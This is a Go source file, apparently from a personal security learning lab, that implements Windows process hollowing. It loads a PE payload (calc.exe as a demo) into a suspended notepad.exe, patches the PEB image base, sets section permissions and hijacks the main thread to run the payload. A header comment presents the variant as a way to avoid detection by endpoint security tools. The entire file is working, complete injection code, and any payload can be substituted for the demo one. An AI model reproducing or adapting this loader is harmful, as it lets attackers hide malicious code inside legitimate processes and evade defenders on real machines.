package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"syscall"
	"time"
	"unsafe"

	"github.com/philcantcode/goodware-lab/file_parsing/pe_parser/pipeline"
	"golang.org/x/sys/windows"
)

/*
Traditional process hollowing steps (--> suspicious to EDRs):

	1. Create a suspended process.
-->	2. Unmap the suspended process's binary image.
	3. Write the PE payload into the same address as the legit process's image.
	4. Perform Relocation.
	5. Fix memory permissions.
	6. Perform thread hijacking to run the payload's entry point.
	7. Resume the process.

Improved process hollowing steps that avoids unmapping the legit process's binary image which
is seen as highly suspicious by EDRs:
	1. Create a suspended process.
	2. Write the PE payload into its preferred base address in the remote process.
	3. Patch `ImageBaseAddress` in the PEB.
	4. Fix memory permissions.
	5. Perform thread hijacking to run the payload's entry point.
	6. Resume the process.
*/

const CREATE_SUSPENDED uint32 = 0x00000004
const NO_CREATION_FLAGS uint32 = 0x00000000

// Characteristics of the sections in the PE payload.
const (
	IMAGE_SCN_MEM_WRITE   = 0x80000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_EXECUTE = 0x20000000
)

func userInput(stage string) {
	var userInput string

	fmt.Printf("Click enter proceed (%s) ...\n", stage)
	fmt.Scanf("%s", &userInput)

}

/*
The first stage just loads the payload into memory using our existing code.
*/
func stage_0_load_payload(pathToPayload string) *pipeline.ParsingJob {
	// Use our existing code to load the file into memory
	payload, err := pipeline.ParsePEx64(pathToPayload)
	if err != nil {
		log.Fatal("Error parsing PE payload: ", err)
	}

	fmt.Printf(
		"ImageBase (preferred mem loc) of the PE payload: 0x%x (size: 0x%x)\n",
		payload.NtHeader.OptionalHeader.ImageBase,
		payload.NtHeader.OptionalHeader.SizeOfImage,
	)

	return payload
}

func stage_1_create_suspended_process(absolutePathToSactificialProcess string) windows.ProcessInformation {
	// Setup the process attributes.
	var startupInfoEx StartupInfoEx
	var pThreadAttribList PROC_THREAD_ATTRIBUTE_LIST
	var securityAttrs windows.SecurityAttributes

	startupInfoEx.Cb = uint32(unsafe.Sizeof(startupInfoEx))
	startupInfoEx.AttributeList = &pThreadAttribList
	securityAttrs.Length = uint32(unsafe.Sizeof(securityAttrs))
	securityAttrs.InheritHandle = 1

	// Setup the target process.
	targetProcess, err := syscall.UTF16PtrFromString(absolutePathToSactificialProcess)
	if err != nil {
		log.Fatal("Error converting string to UTF16: ", err)
	}

	// Process info will be stored here.
	procInfo := windows.ProcessInformation{}

	// 1. Create the process in a suspended state.
	err = CreateProcess(
		nil,
		targetProcess,
		&securityAttrs,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfoEx,
		&procInfo,
	)
	if err != nil {
		log.Fatal("Error creating process: ", err)
	}

	fmt.Printf("Process created in suspended state --> %+v\n", procInfo)

	return procInfo
}

func stage_2_write_payload_to_remote_process(procInfo windows.ProcessInformation, payload *pipeline.ParsingJob) uintptr {
	// 2. Write the PE payload into the remote process.
	ptrRemoteProcBase, err := VirtualAllocEx(
		procInfo.Process,
		uintptr(payload.NtHeader.OptionalHeader.ImageBase),
		uintptr(payload.NtHeader.OptionalHeader.SizeOfImage),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatal("Error allocating memory in the remote process: ", err)
	}

	fmt.Printf("Allocated memory in the remote process at 0x%x\n", ptrRemoteProcBase)

	if uint64(ptrRemoteProcBase) != payload.NtHeader.OptionalHeader.ImageBase {
		log.Fatal("Remote address doesn't match the preferred ImageBase - relocations not supported")
	}

	// Convert payloadNTHeaders to *byte for lpBuffer *byte in WriteProcessMemory.
	allPayloadBytes := new(bytes.Buffer)
	err = binary.Write(allPayloadBytes, binary.LittleEndian, payload.Bytes)
	if err != nil {
		log.Fatal("Error converting payloadNTHeaders to *byte: ", err)
	}

	ptrLocalPayload := &allPayloadBytes.Bytes()[0]
	sizeOfNtHeadersUint := payload.NtHeader.OptionalHeader.SizeOfHeaders // combined size of all headers in the PE file, including the DOS header, PE header, and section headers.
	uintptrSizeOfNtHeadersUint := uintptr(sizeOfNtHeadersUint)
	actualSizeWrittenUintPtr := new(uintptr)

	err = WriteProcessMemory(
		procInfo.Process,           // Handle to the remote process
		ptrRemoteProcBase,          // Ptr to the base address in the remote process
		ptrLocalPayload,            // Ptr to the local buffer containing data to be written to the remote process
		uintptrSizeOfNtHeadersUint, // number of bytes to be written
		actualSizeWrittenUintPtr,   // actual number of bytes written [out]
	)
	if err != nil {
		log.Fatal("Error writing NT headers to the remote process: ", err)
	}

	if *actualSizeWrittenUintPtr != uintptrSizeOfNtHeadersUint {
		log.Fatal("Wrote incorrect number of bytes to the remote process")
	}

	fmt.Printf("Wrote %d bytes to the remote process, expected %d\n", *actualSizeWrittenUintPtr, uintptrSizeOfNtHeadersUint)

	return ptrRemoteProcBase
}

func stage_3_patch_image_base_address_in_peb(procInfo windows.ProcessInformation, payload *pipeline.ParsingJob, ptrRemoteBase uintptr) THEAD_CONTEXT_64 {
	// Get the thread context of the main thread of remote process
	var threadContext THEAD_CONTEXT_64
	err := GetThreadContextFull(procInfo.Thread, &threadContext)
	if err != nil {
		log.Fatal("Error getting thread context: ", err)
	}

	fmt.Printf("Thread context: %+v\n", threadContext)

	// Get the offset of the PEB from the RDX register in the thread context.
	ptrToPeb := threadContext.Rdx
	fmt.Printf("PEB address: 0x%x\n (verify in processhacker General tab)", ptrToPeb)

	// Get the offset of the ImageBaseAddress from the PEB (x64)
	/*
	 http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FPEB.html#:~:text=Undocumented%20functions%20of%20NTDLL&text=Structure%20PEB%20(Process%20Enviroment%20Block,by%20system%20with%20current%20process.&text=ImageBaseAddress%20Address%20of%20executable%20image%20in%20process'%20memory.

	 typedef struct _PEB {
	   BOOLEAN                 InheritedAddressSpace; 	--> 0x00 (1 byte)
	   BOOLEAN                 ReadImageFileExecOptions; --> 0x01 (1 byte)
	   BOOLEAN                 BeingDebugged; 			--> 0x02 (1 byte)
	   BOOLEAN                 Spare; 					--> 0x03 (1 byte)
	   HANDLE                  Mutant;					--> 0x08 (8 bytes)
	   PVOID                   ImageBaseAddress; 		--> 0x10 (8 bytes)
	 } PEB;
	*/
	imageBaseAddressOffset := uint64(0x10)
	uRemoteImageBaseAddress := uintptr(ptrToPeb + imageBaseAddressOffset)
	var actualSizeWrittenUintPtr *uintptr

	// pRemoteAddress to byte array
	var addr uintptr = uintptr(unsafe.Pointer(&ptrRemoteBase))
	ptrToFirstByte := (*byte)(unsafe.Pointer(addr))

	// Write the ImageBaseAddress of the payload to the remote process's PEB.
	// This writes to the ImageBaseAddress field of the PEB in the remote process's memory.
	err = WriteProcessMemory(
		procInfo.Process,             // Handle to the remote process
		uRemoteImageBaseAddress,      // Ptr to base address of remote process
		ptrToFirstByte,               // Pointer to buffer holding data
		unsafe.Sizeof(ptrRemoteBase), // Size of the buffer
		actualSizeWrittenUintPtr,     // Actual number of bytes written [out]
	)
	if err != nil {
		log.Fatal("Error writing ImageBaseAddress to the remote process's PEB: ", err)
	}

	fmt.Printf("Wrote %d bytes of ImageBaseAddress to the remote process's PEB at 0x%x\n", actualSizeWrittenUintPtr, uRemoteImageBaseAddress)

	return threadContext
}

func stage_4_write_sections_and_fix_permissions(payload *pipeline.ParsingJob, ptrRemoteProcBase uintptr, procInfo windows.ProcessInformation) {
	// For each section (e.g. .text, .rdata, .data, .bss, .idata, .edata, .rsrc, .reloc)
	// in the payload, write the section data to the remote process.
	for i := 0; i < int(payload.NtHeader.FileHeader.NumberOfSections); i++ {
		// Get the current section header containing the pointer to the section data
		section := payload.SectionHeaders[i]

		/*
			We now need to write the section data to the remote process.
			First allocate a buffer for the data --> sectionRawData
			Next, seek to the start of the raw data, section.PointerToRawData is an integer offset from the image base where the raw data starts
			Finally, read the section data into sectionRawData
		*/
		sectionRawData := make([]byte, section.SizeOfRawData)
		payload.Reader.Seek(int64(section.PointerToRawData), 0)
		_, err := payload.Reader.Read(sectionRawData)
		if err != nil {
			log.Fatal("Error reading section data: ", err)
		}

		// Print hex of sectionRawData
		fmt.Printf("Section %s first 8 bytes --> %x\n", section.Name, sectionRawData[:8])
		var actualSizeWrittenUintPtr uintptr

		// Write the section data to the remote process
		pRemoteSectionAddress := ptrRemoteProcBase + uintptr(section.VirtualAddress)
		err = WriteProcessMemory(
			procInfo.Process,               // Handle to the remote process
			pRemoteSectionAddress,          // Ptr to the base address in the remote process
			&sectionRawData[0],             // Ptr to the local buffer containing data to be written to the remote process
			uintptr(section.SizeOfRawData), // number of bytes to be written
			&actualSizeWrittenUintPtr,      // actual number of bytes written [out]
		)
		if err != nil {
			log.Fatal("Error writing section data to the remote process: ", err)
		}

		if actualSizeWrittenUintPtr != uintptr(section.SizeOfRawData) {
			log.Fatal("Wrote incorrect number of bytes to the remote process")
		}
	}

	// 4. Fix memory permissions.
	for i := 0; i < int(payload.NtHeader.FileHeader.NumberOfSections); i++ {
		section := payload.SectionHeaders[i]
		// Skip sections with no data
		if section.SizeOfRawData == 0 || section.VirtualAddress == 0 {
			continue
		}

		dwProtection := uint32(0)
		dwOldProtection := uint32(0)

		// Execute, Write and Read permissions (most specific condition)
		if section.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 && section.Characteristics&IMAGE_SCN_MEM_WRITE != 0 && section.Characteristics&IMAGE_SCN_MEM_READ != 0 {
			fmt.Printf("Section %s is execute, write & read\n", section.Name)
			dwProtection = windows.PAGE_EXECUTE_READWRITE
		} else if section.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 && section.Characteristics&IMAGE_SCN_MEM_WRITE != 0 {
			// Execute & write permissions
			fmt.Printf("Section %s is execute & write\n", section.Name)
			dwProtection = windows.PAGE_EXECUTE_WRITECOPY
		} else if section.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 && section.Characteristics&IMAGE_SCN_MEM_READ != 0 {
			// Execute & read permissions
			fmt.Printf("Section %s is execute & read\n", section.Name)
			dwProtection = windows.PAGE_EXECUTE_READ
		} else if section.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 {
			// Execute permissions
			fmt.Printf("Section %s is execute\n", section.Name)
			dwProtection = windows.PAGE_EXECUTE
		} else if section.Characteristics&IMAGE_SCN_MEM_WRITE != 0 && section.Characteristics&IMAGE_SCN_MEM_READ != 0 {
			// Read & write permissions
			fmt.Printf("Section %s is read & write\n", section.Name)
			dwProtection = windows.PAGE_READWRITE
		} else if section.Characteristics&IMAGE_SCN_MEM_READ != 0 {
			// Read-only permissions
			fmt.Printf("Section %s is read-only\n", section.Name)
			dwProtection = windows.PAGE_READONLY
		} else if section.Characteristics&IMAGE_SCN_MEM_WRITE != 0 {
			// Write permissions (least specific condition)
			fmt.Printf("Section %s is write & copy\n", section.Name)
			dwProtection = windows.PAGE_WRITECOPY
		}

		// Change the memory protection of the remote process
		err := VirtualProtectEx(
			procInfo.Process,
			ptrRemoteProcBase+uintptr(section.VirtualAddress),
			uintptr(section.SizeOfRawData),
			dwProtection,
			&dwOldProtection,
		)
		if err != nil {
			log.Fatal("Error changing memory protection: ", err)
		}
	}
}

func stage_5_thread_hijacking(procInfo windows.ProcessInformation, payload *pipeline.ParsingJob, ptrRemoteBase uintptr, threadContext THEAD_CONTEXT_64) {
	/*
		To verify the thread context values, pop open x64dbg and attached to the process
		Find the threads tab and select the main thread
		In the CPU window, you'll see the RCX register which matches the ThreadContext.Rcx value
	*/

	threadContext.Rcx = uint64(ptrRemoteBase) + uint64(payload.NtHeader.OptionalHeader.AddressOfEntryPoint)
	fmt.Printf("Thread RCX: %+v\n", threadContext.Rcx)

	err := SetThreadContext(procInfo.Thread, &threadContext)
	if err != nil {
		log.Fatal("Error setting thread context: ", err)
	}
}

func stage_6_resume_process(procInfo windows.ProcessInformation) {
	// 6. Resume the thread
	err := ResumeThread(procInfo.Thread)
	if err != nil {
		log.Fatal("Error resuming thread: ", err)
	}

	fmt.Println("Thread resumed")

	// Wait for the process to finish
	event, err := windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
	if err != nil {
		log.Fatal("Error waiting for process to finish: ", err)
	}

	fmt.Printf("Process finished --> %d\n", event)
	time.Sleep(5000 * time.Millisecond)
}

// Create the hollowed process.
func main() {
	payload := stage_0_load_payload("C:\\Windows\\System32\\calc.exe")

	procInfo := stage_1_create_suspended_process("C:\\Windows\\System32\\notepad.exe")
	userInput("process created in suspended state")

	ptrRemoteBase := stage_2_write_payload_to_remote_process(procInfo, payload)
	userInput("payload written to remote process")

	threadContext := stage_3_patch_image_base_address_in_peb(procInfo, payload, ptrRemoteBase)
	userInput("ImageBaseAddress patched in PEB")

	stage_4_write_sections_and_fix_permissions(payload, ptrRemoteBase, procInfo)
	userInput("sections written and permissions fixed")

	stage_5_thread_hijacking(procInfo, payload, ptrRemoteBase, threadContext)
	userInput("thread hijacked")

	stage_6_resume_process(procInfo)
	userInput("process resumed")
}
